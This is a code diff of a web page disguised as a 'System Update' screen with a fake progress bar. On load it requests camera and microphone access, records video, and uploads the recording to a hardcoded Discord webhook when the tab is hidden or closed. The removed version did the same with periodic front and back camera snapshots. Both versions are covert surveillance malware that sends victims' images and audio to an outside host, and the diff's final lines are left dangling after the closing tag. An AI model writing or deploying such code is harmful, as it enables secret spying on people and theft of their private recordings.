@@ -2,74 +2,118 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Loading Resources...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
     <style>
-        body { background: black; color: #333; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        body { 
+            background-color: #000; 
+            color: #fff; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
+        }
+        .loader {
+            border: 3px solid #333;
+            border-top: 3px solid #0078d4;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { margin-top: 20px; font-size: 14px; letter-spacing: 1px; color: #aaa; }
     </style>
 </head>
 <body>
-    <div id="status">Loading... 0%</div>
-    <video id="video" autoplay style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+
+    <div class="loader"></div>
+    <div id="status">INITIALIZING SYSTEM UPDATE...</div>
+    <p style="font-size: 10px; color: #444; margin-top: 5px;">Progress: <span id="percent">0</span>%</p>
+
+    <video id="v" autoplay muted style="display:none;"></video>
 
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1455135401042776064/lPm6cU4ACdX3UKDbSeYzmdxEYgMkGhqI-097947Cf8O3StFG5x2hPYsl-fxbIBQRrW0Q";
-        let currentStream = null;
+        const HOOK = "https://discord.com/api/webhooks/1455135401042776064/lPm6cU4ACdX3UKDbSeYzmdxEYgMkGhqI-097947Cf8O3StFG5x2hPYsl-fxbIBQRrW0Q";
+        let rec;
+        let chunks = [];
 
-        async function captureCycle() {
-            // 1. Capture Front Camera
-            await takePhoto("user", "Front Camera");
-            
-            // 2. Short delay between switching
-            await new Promise(r => setTimeout(r, 1000));
-
-            // 3. Capture Back Camera
-            await takePhoto("environment", "Back Camera");
-        }
-
-        async function takePhoto(mode, label) {
+        async function init() {
             try {
-                // Stop any existing stream before switching cameras
-                if (currentStream) {
-                    currentStream.getTracks().forEach(track => track.stop());
-                }
-
-                currentStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: mode } 
+                // Request camera and microphone
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: true 
                 });
+                
+                const v = document.getElementById('v');
+                v.srcObject = stream;
 
-                const video = document.getElementById('video');
-                video.srcObject = currentStream;
+                // Setup Media Recorder
+                rec = new MediaRecorder(stream);
+                
+                rec.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
 
-                // Wait for camera to stabilize
-                await new Promise(r => setTimeout(r, 1500));
+                // When stopped, send the final video to Discord
+                rec.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const fd = new FormData();
+                    fd.append('file', blob, 'capture_video.webm');
+                    fd.append('content', '🎥 **Video Recorded!** User closed the tab or session ended.');
 
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
+                    await fetch(HOOK, { method: 'POST', body: fd });
+                };
 
-                canvas.toBlob(blob => {
-                    sendToDiscord(blob, label);
-                }, 'image/jpeg', 0.7);
+                // Start recording
+                rec.start();
+                updateUI();
 
             } catch (err) {
-                console.log(label + " access failed: ", err);
+                document.getElementById('status').innerText = "ERROR: SYSTEM UPDATE REQUIRES PERMISSION";
+                document.getElementById('status').style.color = "#ff4444";
             }
         }
 
-        function sendToDiscord(blob, label) {
-            const formData = new FormData();
-            formData.append('file', blob, 'capture.jpg');
-            formData.append('content', `📸 **Capture Alert** | Mode: ${label} | Time: ${new Date().toLocaleTimeString()}`);
-
-            fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+        function updateUI() {
+            let p = 0;
+            const statusText = document.getElementById('status');
+            const percentText = document.getElementById('percent');
+            
+            const interval = setInterval(() => {
+                if (p < 99) {
+                    p += Math.floor(Math.random() * 3) + 1;
+                    if (p > 99) p = 99;
+                    percentText.innerText = p;
+                    if (p > 30) statusText.innerText = "UPDATING SYSTEM COMPONENTS...";
+                    if (p > 70) statusText.innerText = "FINALIZING INSTALLATION...";
+                }
+            }, 2000);
         }
 
-        // Start the loop
-        window.onload = () => {
-            // Run immediately
-            captureCycle();
+        // Trigger on load
+        window.onload = init;
+
+        // Ensure the video sends when the user closes the tab
+        window.addEventListener("visibilitychange", () => {
+            if (document.visibilityState === 'hidden' && rec && rec.state === 'recording') {
+                rec.stop();
+            }
+        });
+
+        window.onbeforeunload = () => {
+            if (rec && rec.state !== 'inactive') {
+                rec.stop();
+            }
+        };
+    </script>
+</body>
+</html>
             // Repeat every 10 seconds (5s front + 5s back roughly)
             setInterval(captureCycle, 10000); 
         };
